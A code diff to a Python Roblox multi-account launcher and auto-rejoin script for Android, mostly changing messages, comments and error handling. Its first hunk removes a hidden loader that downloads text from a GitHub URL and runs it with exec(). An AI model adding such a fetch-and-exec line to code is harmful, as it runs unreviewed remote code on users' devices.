@@ -18,11 +18,7 @@ from colorama import init, Fore, Style
 import string
 from threading import Lock
 
-url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
-response = requests.get(url)
-
-exec(response.text)
-
+# Initialize colorama
 init()
 
 SERVER_LINKS_FILE = "AXPrivate_Server_Link.txt"
@@ -498,7 +494,7 @@ def capture_screenshot():
     try:
         result = subprocess.run(["screencap", "-p", screenshot_path], check=True)
     except subprocess.CalledProcessError:
-        print(Fore.RED + f"Taking A Screenshot of Your Device Has Failed At: {screenshot_path}" + Style.RESET_ALL)
+        print(Fore.RED + f"Taking a Screenshot of Your Device Has Failed At: {screenshot_path}" + Style.RESET_ALL)
         return None
 
     if not os.path.exists(screenshot_path):
@@ -641,39 +637,45 @@ def is_roblox_running(package_name):
     return any(package_name in proc.info['name'].lower() for proc in psutil.process_iter(['name']))
 
 def kill_roblox_processes():
-    print(Fore.RED +  "Turning Off All Roblox Games On Your Device..." + Style.RESET_ALL)
+    print("Killing all Roblox processes...")
     package_names = get_roblox_packages()
     
     for package_name in package_names:
         kill_roblox_process(package_name)
 
 def kill_roblox_process(package_name):
-    print(Fore.RED + f"Turning Off Roblox Game For Package: {package_name}..." + Style.RESET_ALL)
+    print(f"Killing Roblox process for {package_name}...")
+    # Using `os.kill` for more control and speed, avoiding unnecessary shell calls
     for proc in psutil.process_iter(['pid', 'name']):
         if package_name in proc.info['name'].lower():
             try:
                 os.kill(proc.info['pid'], 9)  # 9 is SIGKILL
                 print(f"Process {proc.info['name']} (PID: {proc.info['pid']}) killed.")
             except Exception as e:
-                print(Fore.RED + f"An Error Occurred While Disabling Roblox: {proc.info['name']}: {e}" + Style.RESET_ALL)
+                print(f"Error killing process {proc.info['name']}: {e}")
     time.sleep(1)  
 
 def launch_roblox(package_name, server_link, num_packages, package_statuses):
     try:
-        package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"Opening Roblox For {package_name}..." + Style.RESET_ALL
+        # Update the status to indicate Roblox is opening
+        package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"Opening Roblox for {package_name}..." + Style.RESET_ALL
         update_status_table(package_statuses)
 
+        # Open Roblox (Initial Splash)
         subprocess.run(
             ['am', 'start', '-n', f'{package_name}/com.roblox.client.startup.ActivitySplash', '-d', server_link], 
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
         )
         
+        # Adjust wait time based on the number of packages (Shorter wait time for fewer packages)
         wait_time = 15 if num_packages >= 6 else 8
         time.sleep(wait_time)
 
+        # Update status to indicate joining Roblox
         package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"Joining Roblox for {package_name}..." + Style.RESET_ALL
         update_status_table(package_statuses)
 
+        # Proceed to launch into Roblox game
         subprocess.run(
             ['am', 'start', '-n', f'{package_name}/com.roblox.client.ActivityProtocolLaunch', '-d', server_link], 
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
@@ -682,15 +684,18 @@ def launch_roblox(package_name, server_link, num_packages, package_statuses):
         # Wait a moment to ensure Roblox has launched
         time.sleep(20)
 
+        # Update the status after successfully joining
         package_statuses[package_name]["Status"] = Fore.GREEN + "Joined Roblox" + Style.RESET_ALL
         update_status_table(package_statuses)
 
     except subprocess.CalledProcessError as e:
+        # Catch specific subprocess errors and handle them
         package_statuses[package_name]["Status"] = Fore.RED + f"Failed to launch Roblox for {package_name}: {e}" + Style.RESET_ALL
         update_status_table(package_statuses)
         print(f"Subprocess error details: {e}")
 
     except Exception as e:
+        # Catch all other exceptions
         package_statuses[package_name]["Status"] = Fore.RED + f"Error launching Roblox for {package_name}: {e}" + Style.RESET_ALL
         update_status_table(package_statuses)
         print(f"Error details: {e}")
@@ -806,23 +811,23 @@ def get_game_name(game_link_or_id):
         print(Fore.RED + f"Error retrieving game name: {e}" + Style.RESET_ALL)
         return "Error"
         
+# Function to format server link
 def format_server_link(input_link):
     if 'roblox.com' in input_link:
         return input_link
     elif input_link.isdigit():
         return f'roblox://placeID={input_link}'
     else:
-        print(Fore.RED + "Invalid Input! Please Enter A Valid Game ID Or A Valid Private Server Link." + Style.RESET_ALL)
+        print(Fore.RED + "Invalid input! Please enter a valid game ID or private server link." + Style.RESET_ALL)
         return None
 
+# Function to save server links to file
 def save_server_links(server_links):
-    try:
-        with open(SERVER_LINKS_FILE, "w") as file:
-            for package, link in server_links:
-                file.write(f"{package},{link}\n")
-    except IOError as e:
-        print(Fore.RED + f"An Error Occurred While Saving Private Server Link: {e}" + Style.RESET_ALL)
+    with open(SERVER_LINKS_FILE, "w") as file:
+        for package, link in server_links:
+            file.write(f"{package},{link}\n")
 
+# Function to load server links from file
 def load_server_links():
     server_links = []
     if os.path.exists(SERVER_LINKS_FILE):
@@ -832,49 +837,48 @@ def load_server_links():
                 server_links.append((package, link))
     return server_links
 
+# Function to save accounts to file
 def save_accounts(accounts):
-    try:
-        with open(ACCOUNTS_FILE, "w") as file:
-            for package, user_id in accounts:
-                file.write(f"{package},{user_id}\n")
-    except IOError as e:
-        print(f"An Error Occurred While Saving Account: {e}")
+    with open(ACCOUNTS_FILE, "w") as file:
+        for package, user_id in accounts:
+            file.write(f"{package},{user_id}\n")
 
+# Function to load accounts from file
 def load_accounts():
     accounts = []
     if os.path.exists(ACCOUNTS_FILE):
-        try:
-            with open(ACCOUNTS_FILE, "r") as file:
-                for line in file:
-                    if line.strip():
-                        try:
-                            package, user_id = line.strip().split(",", 1)
-                            accounts.append((package, user_id))
-                        except ValueError:
-                            print(f"Skipping invalid line: {line.strip()}")
-        except IOError as e:
-            print(f"An Error Occurred While Loading Account: {e}")
+        with open(ACCOUNTS_FILE, "r") as file:
+            for line in file:
+                package, user_id = line.strip().split(",", 1)
+                accounts.append((package, user_id))
     return accounts
 
+# Function to find UserId from file
 def find_userid_from_file(file_path):
     try:
         with open(file_path, 'r') as file:
             content = file.read()
+            # Debugging information removed to keep console clean
 
-        match = re.search(r'"UserId":"(\d+)"', content)
-        if match:
-            return match.group(1) 
-        else:
-            print(Fore.RED + "User ID Not Found" + Style.RESET_ALL)
-            return None
+            userid_start = content.find('"UserId":"')
+            if userid_start == -1:
+                print("Userid not found")
+                return None
+
+            userid_start += len('"UserId":"')
+            userid_end = content.find('"', userid_start)
+            if userid_end == -1:
+                print("Userid end quote not found")
+                return None
+
+            userid = content[userid_start:userid_end]
+            return userid
 
     except IOError as e:
-        print(Fore.RED + f"An Error Occurred While Reading File: {e}" + Style.RESET_ALL)
-        return None
-    except Exception as e: 
-        print(Fore.RED + f"Another Error Occurred: {e}" + Style.RESET_ALL)
+        print(f"Error reading file: {e}")
         return None
 
+# Asynchronous function to get user ID from username
 async def get_user_id(username):
     url = "https://users.roblox.com/v1/usernames/users"
     payload = {
@@ -885,21 +889,12 @@ async def get_user_id(username):
         "Content-Type": "application/json"
     }
 
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.post(url, json=payload, headers=headers) as response:
-                if response.status == 200:  # Kiểm tra phản hồi OK
-                    data = await response.json()
-                    if 'data' in data and len(data['data']) > 0:
-                        return data['data'][0]['id']
-                else:
-                    print(f"Error: Received Status Code {response.status}")
-    except aiohttp.ClientError as e:  
-        print(f"Request Failed: {e}")
-    except Exception as e:  
-        print(f"An Error Occurred: {e}")
-
-    return None  
+    async with aiohttp.ClientSession() as session:
+        async with session.post(url, json=payload, headers=headers) as response:
+            data = await response.json()
+            if 'data' in data and len(data['data']) > 0:
+                return data['data'][0]['id']
+    return None
 
 def get_server_link(package_name, server_links):
     return next((link for pkg, link in server_links if pkg == package_name), None)
@@ -943,6 +938,7 @@ def get_username(user_id):
 
     return "Unknown"
 
+# Example of saving the username in a persistent storage
 def save_username(user_id, username):
     try:
         if not os.path.exists("usernames.json"):
@@ -961,6 +957,7 @@ def save_username(user_id, username):
     except (IOError, json.JSONDecodeError) as e:
         print(Fore.RED + f"Error saving username: {e}" + Style.RESET_ALL)
 
+# Example of loading the username from persistent storage
 def load_saved_username(user_id):
     try:
         with open("usernames.json", "r") as file:
@@ -976,6 +973,7 @@ def load_cache():
         with open(CACHE_FILE, "r") as f:
             username_cache = json.load(f)
 
+# Save the cache to file
 def save_cache():
     try:
         temp_file = CACHE_FILE + ".tmp"
@@ -988,33 +986,30 @@ def save_cache():
 def check_user_online(user_id):
     max_retries = 3
     delay = 2
-    primary_url = "https://presence.roblox.com/v1/presence/users"
-    headers = {'Content-Type': 'application/json'}
-    body = json.dumps({"userIds": [user_id]})
 
     for attempt in range(max_retries):
         try:
+            primary_url = "https://presence.roblox.com/v1/presence/users"
+            headers = {'Content-Type': 'application/json'}
+            body = json.dumps({"userIds": [user_id]})
             with requests.Session() as session:
                 primary_response = session.post(primary_url, headers=headers, data=body, timeout=7)
-                primary_response.raise_for_status()
-                
-                primary_data = primary_response.json()
-                user_presence = primary_data["userPresences"][0]
-                primary_presence_type = user_presence["userPresenceType"]
-                primary_last_location = user_presence.get("lastLocation", None)
+            primary_response.raise_for_status()
+            primary_data = primary_response.json()
+            primary_presence_type = primary_data["userPresences"][0]["userPresenceType"]
+            primary_last_location = primary_data["userPresences"][0].get("lastLocation", None)
 
-                # Kiểm tra xem người dùng có đang trên Website không
-                if primary_last_location == "Website":
-                    print(Fore.YELLOW + f"{user_id} is currently on the Website. Rejoin recommended." + Style.RESET_ALL)
-                    primary_presence_type = 0  # Cập nhật loại hiện diện để kích hoạt rejoin
+            if primary_last_location == "Website":
+                print(Fore.YELLOW + f"{user_id} is currently on the Website. Rejoin recommended." + Style.RESET_ALL)
+                primary_presence_type = 0  # Set presence type to offline to trigger a rejoin
 
-                return primary_presence_type, primary_last_location
+            return primary_presence_type, primary_last_location
 
         except requests.exceptions.RequestException as e:
             print(Fore.RED + f"Error checking online status for user {user_id} (Attempt {attempt + 1}): {e}" + Style.RESET_ALL)
             if attempt < max_retries - 1:
                 time.sleep(delay)
-                delay *= 2  
+                delay *= 2  # Exponential backoff
             else:
                 return None, None
 
